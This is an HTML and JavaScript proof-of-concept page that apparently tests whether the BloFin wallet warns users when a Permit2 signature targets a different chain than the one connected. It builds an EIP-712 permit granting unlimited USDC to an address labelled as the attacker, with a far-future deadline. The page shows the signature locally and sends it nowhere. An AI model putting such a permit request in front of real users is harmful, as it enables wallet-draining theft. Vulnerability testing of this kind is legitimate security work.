<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BLOFIN TEST / CHAINID MISMATCH</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #fff; padding: 20px; }
button { width: 100%; padding: 15px; margin: 10px 0; background: #7c3aed; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; }
button:disabled { background: #333; }
.log { background: #111; padding: 15px; border-radius: 10px; margin-top: 15px; word-break: break-all; font-size: 12px; border: 1px solid #333; }
.red { color: #ef4444; }.green { color: #22c55e; }.yellow { color: #eab308; }
h2 { color: #7c3aed; }
</style>
</head>
<body>

<h2>BLOFIN TEST / CHAINID MISMATCH [Critical]</h2>
<p>Test: Wallet on BSC (56) but signing message for ETH Mainnet (1)</p>

<button id="connect">1. CONNECT WALLET</button>
<div id="status" class="log">Status: Not connected</div>

<button id="testMismatch">2. TEST CHAINID MISMATCH (chainId: 1 on BSC)</button>
<button id="testCorrect">3. TEST CORRECT (chainId: 56 on BSC) - Control</button>

<div id="log" class="log">Logs will appear here...</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
let provider, signer, userAddress;
const logEl = document.getElementById('log');
const statusEl = document.getElementById('status');

function log(msg, cls='') {
  logEl.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
}

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const SPENDER_ATTACKER = "0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";

const domainMismatch = {
  name: "Permit2",
  chainId: 1,
  verifyingContract: PERMIT2_ADDRESS
};

const domainCorrect = {
  name: "Permit2",
  chainId: 56,
  verifyingContract: PERMIT2_ADDRESS
};

const types = {
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" }
  ],
  PermitWitnessTransferFrom: [
    { name: "permitted", type: "TokenPermissions" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "witness", type: "Witness" }
  ],
  Witness: [
    { name: "message", type: "string" },
    { name: "chainInfo", type: "string" }
  ]
};

function getMessage(isMismatch) {
  return {
    permitted: {
      token: USDC_ADDRESS,
      amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    },
    spender: SPENDER_ATTACKER,
    nonce: "0",
    deadline: "9999999999999",
    witness: {
      message: isMismatch? "CHAINID MISMATCH TEST: You are on BSC but signing for ETH" : "CORRECT CHAIN TEST: BSC to BSC",
      chainInfo: isMismatch? "Wallet: BSC (56) | Domain: ETH (1) | EXPLOITABLE" : "Wallet: BSC (56) | Domain: BSC (56) | SAFE"
    }
  };
}

document.getElementById('connect').onclick = async () => {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    const network = await provider.getNetwork();
    statusEl.innerHTML = `Connected: ${userAddress}<br>Current ChainId: ${network.chainId}`;
    log(`Connected ${userAddress} on chain ${network.chainId}`, "green");
    if (network.chainId!== 56) {
      log(`WARNING: Switch to BSC (56). Current is ${network.chainId}`, "yellow");
    } else {
      log(`Perfect! You are on BSC (56). Now test MISMATCH (chainId 1)`, "yellow");
    }
  } catch (e) {
    log("Connect failed: " + e.message, "red");
  }
};

async function sign(isMismatch) {
  try {
    if (!signer) { log("Connect first", "red"); return; }
    const domain = isMismatch? domainMismatch : domainCorrect;
    const message = getMessage(isMismatch);
    const network = await provider.getNetwork();

    log(`Signing... Wallet Chain: ${network.chainId} | Domain Chain: ${domain.chainId}`, "yellow");
    log(`If NO Chain Mismatch warning, BUG CONFIRMED`, "red");

    const signature = await signer._signTypedData(domain, types, message);

    log(`SIGNATURE: ${signature}`, "green");
    log(`BUG CONFIRMED: Allowed chainId ${domain.chainId} while on ${network.chainId}`, "red");

  } catch (e) {
    log("Sign failed: " + (e.message || e), "red");
  }
}

document.getElementById('testMismatch').onclick = () => sign(true);
document.getElementById('testCorrect').onclick = () => sign(false);
</script>
</body>
</html>
